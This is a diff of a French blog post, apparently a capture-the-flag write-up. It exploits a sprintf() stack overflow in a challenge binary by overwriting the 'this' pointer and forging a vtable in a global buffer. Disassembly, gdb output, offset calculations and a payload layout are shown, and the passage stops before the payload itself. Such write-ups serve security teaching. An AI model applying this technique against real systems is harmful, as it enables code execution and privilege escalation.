-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048832</span>                 <span class="k">call</span>    <span class="n">vuln</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048832</span> <span class="n">main</span>            <span class="n">endp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048832</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048837</span> <span class="c">; ---------------------------------------------------------------------------</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048837</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804883</span><span class="n">C</span>                 <span class="k">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">24</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804883</span><span class="n">F</span>                 <span class="k">pop</span>     <span class="n">ecx</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048840</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048841</span>                 <span class="k">lea</span>     <span class="n">esp</span><span class="p">,</span> <span class="err">[</span><span class="n">ecx</span><span class="o">-</span><span class="mi">4</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048844</span>                 <span class="k">retn</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nl">.text:</span><span class="err">08048800</span>                 <span class="nf">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">18h</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">08048803</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">08048806</span>                 <span class="nf">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">8</span>
+<span class="nl">.text:</span><span class="err">08048809</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804880</span><span class="nf">B</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">30h</span><span class="o">+</span><span class="nv">nptr</span><span class="p">],</span> <span class="nb">eax</span> <span class="c1">; nptr</span>
+<span class="nl">.text:</span><span class="err">0804880</span><span class="nf">E</span>                 <span class="nv">call</span>    <span class="nv">_atoi</span>
+<span class="nl">.text:</span><span class="err">08048813</span>                 <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">08048816</span>                 <span class="nf">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">18h</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">08048819</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804881</span><span class="nf">C</span>                 <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">4</span>
+<span class="nl">.text:</span><span class="err">0804881</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">08048821</span>                 <span class="nf">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">30h</span><span class="o">+</span><span class="nv">str</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">08048825</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">08048828</span>                 <span class="nf">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">30h</span><span class="o">+</span><span class="nv">value</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">0804882</span><span class="nf">C</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0Ch</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804882</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">30h</span><span class="o">+</span><span class="nv">nptr</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">08048832</span>                 <span class="nf">call</span>    <span class="nv">vuln</span>
+<span class="nl">.text:</span><span class="err">08048832</span> <span class="nf">main</span>            <span class="nv">endp</span>
+<span class="nl">.text:</span><span class="err">08048832</span>
+<span class="nl">.text:</span><span class="err">08048837</span> <span class="c1">; ---------------------------------------------------------------------------</span>
+<span class="nl">.text:</span><span class="err">08048837</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
+<span class="nl">.text:</span><span class="err">0804883</span><span class="nf">C</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">24h</span>
+<span class="nl">.text:</span><span class="err">0804883</span><span class="nf">F</span>                 <span class="nv">pop</span>     <span class="nb">ecx</span>
+<span class="nl">.text:</span><span class="err">08048840</span>                 <span class="nf">pop</span>     <span class="nb">ebp</span>
+<span class="nl">.text:</span><span class="err">08048841</span>                 <span class="nf">lea</span>     <span class="nb">esp</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">08048844</span>                 <span class="nf">retn</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Ca nous donne donc:</p>
 
 <figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="n">vuln</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="n">vuln</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Regardons ce qui se passe dans vuln(). On repère 2 fonction intéressantes: sprintf() et memcpy() qui peuvent être susceptible à des overflows si des arguments sont controlés.</p>
 
@@ -388,48 +377,49 @@ argv[2] et argv[1].</p>
 40
 41
 42
-</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span> <span class="c">; =============== S U B R O U T I N E =======================================</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span> <span class="c">; Attributes: noreturn bp-based frame</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span> <span class="n">vuln</span>            <span class="n">proc</span> <span class="n">near</span>               <span class="c">; CODE XREF: main+69 p</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span> <span class="n">buf</span>             <span class="o">=</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">32</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span> <span class="n">this</span>            <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">8</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span> <span class="n">value</span>           <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">0</span><span class="n">Ch</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span> <span class="k">str</span>             <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">10</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">C</span>                 <span class="k">push</span>    <span class="n">ebp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">D</span>                 <span class="k">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804896</span><span class="n">F</span>                 <span class="k">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">58</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048972</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">value</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048975</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048979</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="k">str</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804897</span><span class="n">C</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048980</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">offset</span> <span class="n">aUploading___SD</span> <span class="c">; "Uploading... [%s]: %d pts\n"</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048988</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804898</span><span class="n">B</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>      <span class="c">; s</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804898</span><span class="n">E</span>                 <span class="k">call</span>    <span class="n">_sprintf</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048993</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="mi">32</span><span class="n">h</span> <span class="c">; n</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804899</span><span class="n">B</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804899</span><span class="n">E</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; buf</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">A2</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">s</span> <span class="c">; dest</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">A9</span>                 <span class="k">call</span>    <span class="n">_memcpy</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">AE</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">this</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">B1</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[eax]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">B3</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="p">[eax]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">B5</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">offset</span> <span class="n">s</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">BD</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">this</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">C0</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">C3</span>                 <span class="k">call</span>    <span class="n">edx</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">C5</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">this</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">C8</span>                 <span class="k">mov</span>     <span class="p">[esp],</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">CB</span>                 <span class="k">call</span>    <span class="n">send_points</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">CB</span> <span class="n">vuln</span>            <span class="n">endp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">CB</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">D0</span> <span class="c">; ---------------------------------------------------------------------------</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">D0</span>                 <span class="k">leave</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">D1</span>                 <span class="k">retn</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span> <span class="c1">; Attributes: noreturn bp-based frame</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span> <span class="nv">vuln</span>            <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+69 p</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">32h</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span> <span class="nv">this</span>            <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mi">8</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span> <span class="nv">value</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mh">0Ch</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span> <span class="nv">str</span>             <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mh">10h</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">C</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">D</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nl">.text:</span><span class="err">0804896</span><span class="nf">F</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">58h</span>
+<span class="nl">.text:</span><span class="err">08048972</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">value</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">08048975</span>                 <span class="nf">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0Ch</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">08048979</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">str</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804897</span><span class="nf">C</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">08048980</span>                 <span class="nf">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">aUploading___SD</span> <span class="c1">; "Uploading... [%s]: %d pts\n"</span>
+<span class="nl">.text:</span><span class="err">08048988</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804898</span><span class="nf">B</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">eax</span>      <span class="c1">; s</span>
+<span class="nl">.text:</span><span class="err">0804898</span><span class="nf">E</span>                 <span class="nv">call</span>    <span class="nv">_sprintf</span>
+<span class="nl">.text:</span><span class="err">08048993</span>                 <span class="nf">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mh">32h</span> <span class="c1">; n</span>
+<span class="nl">.text:</span><span class="err">0804899</span><span class="nf">B</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804899</span><span class="nf">E</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">eax</span>    <span class="c1">; buf</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">A2</span>                 <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">s</span> <span class="c1">; dest</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">A9</span>                 <span class="nv">call</span>    <span class="nv">_memcpy</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">AE</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">this</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">B1</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">B3</span>                 <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">B5</span>                 <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">s</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">BD</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">this</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">C0</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">C3</span>                 <span class="nv">call</span>    <span class="nb">edx</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">C5</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">this</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">C8</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">CB</span>                 <span class="nv">call</span>    <span class="nv">send_points</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">CB</span> <span class="nv">vuln</span>            <span class="nv">endp</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">CB</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">D0</span> <span class="c1">; ---------------------------------------------------------------------------</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">D0</span>                 <span class="nv">leave</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">D1</span>                 <span class="nv">retn</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On a les choses suivantes:</p>
 
@@ -440,14 +430,16 @@ argv[2] et argv[1].</p>
 </pre></td><td class="code"><pre><span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"Uploading... [%s]: %d pts</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
 <span class="n">memcpy</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
 <span class="n">this</span><span class="o">-&gt;</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">fct</span><span class="p">(</span><span class="n">s</span><span class="p">);</span> <span class="c1">// avec fct normalement égal à l'adresse de show_string()</span>
-<span class="n">send_points</span><span class="p">(</span><span class="n">this</span><span class="p">);</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">send_points</span><span class="p">(</span><span class="n">this</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On a les variables suivantes:</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>buf = buffer local de 50 octets
-s = buffer global</pre></td></tr></tbody></table></code></pre></figure>
+s = buffer global
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Donc la vulnérabilitée se trouve au niveau du sprintf() qui overflow sur une partie de la stack et qui permet donc de re-écrire en autre this.
 On va re-écrire this et pouvoir se crafter une vtable dans le buffer global, ça permet de bypasser l’ASLR sans souci.</p>
@@ -459,11 +451,12 @@ On va re-écrire this et pouvoir se crafter une vtable dans le buffer global, ç
 3
 4
 5
-</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">AE</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">this</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">B1</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[eax]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">B3</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="p">[eax]</span>
-<span class="err">[</span><span class="p">...</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080489</span><span class="n">C3</span>                 <span class="k">call</span>    <span class="n">edx</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nl">.text:</span><span class="err">080489</span><span class="nf">AE</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">this</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">B1</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">B3</span>                 <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080489</span><span class="nf">C3</span>                 <span class="nv">call</span>    <span class="nb">edx</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <h1 id="exploitation-in-progress-">Exploitation in progress …</h1>
 
@@ -578,7 +571,8 @@ gs             0x33 51
 0x80489c8: mov    %eax,(%esp)
 0x80489cb: call   0x8048870
 0x80489d0: leave  
-(gdb) </span></pre></td></tr></tbody></table></code></pre></figure>
+(gdb) </span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>this pointant vers une valeur invalide, on trigger notre segfault :).</p>
 
@@ -587,7 +581,8 @@ gs             0x33 51
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>~/repos/msf3<span class="nv">$ </span>tools/pattern_offset.rb <span class="sb">`</span><span class="nb">printf</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">35"</span><span class="sb">`</span>
-44</pre></td></tr></tbody></table></code></pre></figure>
+44
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On doit d’abord faire de petits calculs d’offset pour savoir où se trouve notre chaîne:</p>
 
@@ -602,7 +597,8 @@ gs             0x33 51
 // strlen("Uploading...") == 14
 0x08049DC0 + 14 = 0x08049DCE
 // addresse où se trouve notre this
-0x08049DCE + 44 = 0x08049DFA</pre></td></tr></tbody></table></code></pre></figure>
+0x08049DCE + 44 = 0x08049DFA
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>On va maintenant pouvoir pawn le challenge comme il faut, pour celà, je vais vous montrer 2 patterns d’attaques j’ai utilisé pour ce faire.</p>
 
@@ -620,15 +616,18 @@ On peut exploiter le challenge en utilisant le code suivante:</p>
                     44 bytes                                                      |    4 bytes     |   ?
 this = 0x08049dd5 = address de ptr
 ptr  = 0x08049dd9
-fct  = 0x08049dce</pre></td></tr></tbody></table></code></pre></figure>
+fct  = 0x08049dce
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Je vais utiliser la payload suivante (bash -p):</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
